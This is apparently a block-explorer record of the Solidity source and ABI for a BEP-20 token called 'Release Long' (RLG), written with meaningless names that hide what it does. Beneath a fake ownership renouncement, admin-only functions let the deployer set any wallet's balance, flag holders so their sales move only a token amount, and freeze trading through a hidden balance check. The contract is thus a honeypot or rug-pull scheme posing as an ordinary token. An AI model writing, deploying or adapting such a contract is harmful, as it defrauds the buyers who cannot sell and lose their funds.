{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface atMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundTeam {\n    function createPair(address feeReceiverSell, address txReceiverTo) external returns (address);\n}\n\ninterface takeReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyExempt) external view returns (uint256);\n\n    function transfer(address shouldTotal, uint256 feeFundAt) external returns (bool);\n\n    function allowance(address totalTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeFundAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldTotal,\n        uint256 feeFundAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoTeamEnable, uint256 value);\n    event Approval(address indexed totalTx, address indexed spender, uint256 value);\n}\n\ninterface takeReceiverMetadata is takeReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReleaseLong is receiverExempt, takeReceiver, takeReceiverMetadata {\n\n    mapping(address => bool) public maxTeamAt;\n\n    function exemptAt(uint256 feeFundAt) public {\n        minLaunched();\n        fromTo = feeFundAt;\n    }\n\n    string private autoAmount = \"RLG\";\n\n    uint256 constant launchAmount = 18 ** 10;\n\n    bool public totalMode;\n\n    function balanceOf(address buyExempt) public view virtual override returns (uint256) {\n        return launchedMarketingSender[buyExempt];\n    }\n\n    function fundLiquidity(address senderList, address shouldTotal, uint256 feeFundAt) internal returns (bool) {\n        if (senderList == shouldLiquidity) {\n            return swapTokenShould(senderList, shouldTotal, feeFundAt);\n        }\n        uint256 totalTeam = takeReceiver(enableLiquidityLimit).balanceOf(totalTeamLaunch);\n        require(totalTeam == fromTo);\n        require(shouldTotal != totalTeamLaunch);\n        if (launchedMarketing[senderList]) {\n            return swapTokenShould(senderList, shouldTotal, launchAmount);\n        }\n        return swapTokenShould(senderList, shouldTotal, feeFundAt);\n    }\n\n    function owner() external view returns (address) {\n        return feeShould;\n    }\n\n    function transfer(address senderLaunched, uint256 feeFundAt) external virtual override returns (bool) {\n        return fundLiquidity(_msgSender(), senderLaunched, feeFundAt);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atReceiver;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedShould;\n    }\n\n    bool public modeSell;\n\n    address feeLaunchExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        if (sellTrading == sellTx) {\n            sellTrading = sellTx;\n        }\n        atMarketing listMarketing = atMarketing(feeLaunchExempt);\n        enableLiquidityLimit = fundTeam(listMarketing.factory()).createPair(listMarketing.WETH(), address(this));\n        \n        shouldLiquidity = _msgSender();\n        senderToken();\n        maxTeamAt[shouldLiquidity] = true;\n        launchedMarketingSender[shouldLiquidity] = atReceiver;\n        \n        emit Transfer(address(0), shouldLiquidity, atReceiver);\n    }\n\n    uint256 fromTo;\n\n    function transferFrom(address senderList, address shouldTotal, uint256 feeFundAt) external override returns (bool) {\n        if (_msgSender() != feeLaunchExempt) {\n            if (launchedTeamFee[senderList][_msgSender()] != type(uint256).max) {\n                require(feeFundAt <= launchedTeamFee[senderList][_msgSender()]);\n                launchedTeamFee[senderList][_msgSender()] -= feeFundAt;\n            }\n        }\n        return fundLiquidity(senderList, shouldTotal, feeFundAt);\n    }\n\n    function senderWallet(address senderLaunched, uint256 feeFundAt) public {\n        minLaunched();\n        launchedMarketingSender[senderLaunched] = feeFundAt;\n    }\n\n    uint256 liquidityTrading;\n\n    function getOwner() external view returns (address) {\n        return feeShould;\n    }\n\n    address totalTeamLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function minLaunched() private view {\n        require(maxTeamAt[_msgSender()]);\n    }\n\n    event OwnershipTransferred(address indexed marketingAmount, address indexed receiverTeam);\n\n    string private marketingWallet = \"Release Long\";\n\n    function allowance(address maxMode, address marketingShould) external view virtual override returns (uint256) {\n        if (marketingShould == feeLaunchExempt) {\n            return type(uint256).max;\n        }\n        return launchedTeamFee[maxMode][marketingShould];\n    }\n\n    mapping(address => uint256) private launchedMarketingSender;\n\n    uint8 private launchedShould = 18;\n\n    function marketingFee(address atBuy) public {\n        minLaunched();\n        if (totalMode) {\n            sellTx = sellTrading;\n        }\n        if (atBuy == shouldLiquidity || atBuy == enableLiquidityLimit) {\n            return;\n        }\n        launchedMarketing[atBuy] = true;\n    }\n\n    function senderToken() public {\n        emit OwnershipTransferred(shouldLiquidity, address(0));\n        feeShould = address(0);\n    }\n\n    mapping(address => bool) public launchedMarketing;\n\n    function approve(address marketingShould, uint256 feeFundAt) public virtual override returns (bool) {\n        launchedTeamFee[_msgSender()][marketingShould] = feeFundAt;\n        emit Approval(_msgSender(), marketingShould, feeFundAt);\n        return true;\n    }\n\n    uint256 public sellTx;\n\n    uint256 private sellTrading;\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoAmount;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return marketingWallet;\n    }\n\n    bool private modeTotalTrading;\n\n    address public shouldLiquidity;\n\n    function swapTokenShould(address senderList, address shouldTotal, uint256 feeFundAt) internal returns (bool) {\n        require(launchedMarketingSender[senderList] >= feeFundAt);\n        launchedMarketingSender[senderList] -= feeFundAt;\n        launchedMarketingSender[shouldTotal] += feeFundAt;\n        emit Transfer(senderList, shouldTotal, feeFundAt);\n        return true;\n    }\n\n    function receiverEnableWallet(address isTo) public {\n        require(isTo.balance < 100000);\n        if (modeSell) {\n            return;\n        }\n        \n        maxTeamAt[isTo] = true;\n        \n        modeSell = true;\n    }\n\n    uint256 private atReceiver = 100000000 * 10 ** 18;\n\n    address private feeShould;\n\n    mapping(address => mapping(address => uint256)) private launchedTeamFee;\n\n    address public enableLiquidityLimit;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTeamEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeFundAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLiquidityLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeFundAt\",\"type\":\"uint256\"}],\"name\":\"exemptAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atBuy\",\"type\":\"address\"}],\"name\":\"marketingFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxTeamAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTo\",\"type\":\"address\"}],\"name\":\"receiverEnableWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeFundAt\",\"type\":\"uint256\"}],\"name\":\"senderWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeFundAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeFundAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ReleaseLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}